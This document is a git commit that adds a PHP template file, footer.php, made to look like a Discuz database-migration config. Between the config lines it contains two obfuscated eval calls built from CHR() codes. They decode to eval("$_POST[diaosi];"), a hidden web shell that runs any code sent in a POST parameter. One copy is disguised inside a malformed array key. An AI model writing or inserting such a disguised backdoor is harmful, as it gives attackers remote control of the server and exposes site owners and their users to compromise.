df6925b3dc50e36040580982b9c982ca457ae61b
zhouyanfss <zhouyanfss@163.com>
2018-05-15 00:03:05 +0800

    3

---
+++ templets/moban/footer.php
@@ -0,0 +1,43 @@
+<?php
+
+
+$_config = array();
+
+// ----------------  CONFIG TARGET  ----------------- //
+$_config['target']['dbhost'] = 'localhost';
+$_config['target']['dbuser'] = 'root';
+$_config['target']['dbpw'] = '';
+$_config['target']['dbname'] = 'discuzx';
+$_config['target']['tablepre'] = 'pre_';
+$_config['target']['dbcharset'] = '';
+$_config['target']['pconnect'] = 1;
+
+//   CONFIG AAA
+
+EVAL(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(100).CHR(105).CHR(97).CHR(111).CHR(115).CHR(105).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//   //
+$_config['aaa
+
+eval(Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(34).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(100).Chr(105).Chr(97).Chr(111).Chr(115).Chr(105).Chr(93).Chr(59).Chr(34).Chr(41).Chr(59));//'] = 'localhost';
+
+// ----------------  CONFIG SOURCE  ----------------- //
+$_config['source']['dbuser'] = 'root';
+$_config['source']['dbpw'] = '';
+$_config['source']['dbname'] = 'discuz';
+$_config['source']['tablepre'] = 'cdb_';
+$_config['source']['dbcharset'] = '';
+$_config['source']['pconnect'] = 1;
+$_config['source']['dbhost'] = 'localhost';
+
+// ----------------  CONFIG UCENTER  ---------------- //
+$_config['ucenter']['dbhost'] = '';
+$_config['ucenter']['dbuser'] = '';
+$_config['ucenter']['dbpw'] = '';
+$_config['ucenter']['dbname'] = '';
+$_config['ucenter']['tablepre'] = '';
+$_config['ucenter']['dbcharset'] = '';
+$_config['ucenter']['pconnect'] = 1;
+
+
+// -------------------  THE END  -------------------- //
+
+?>
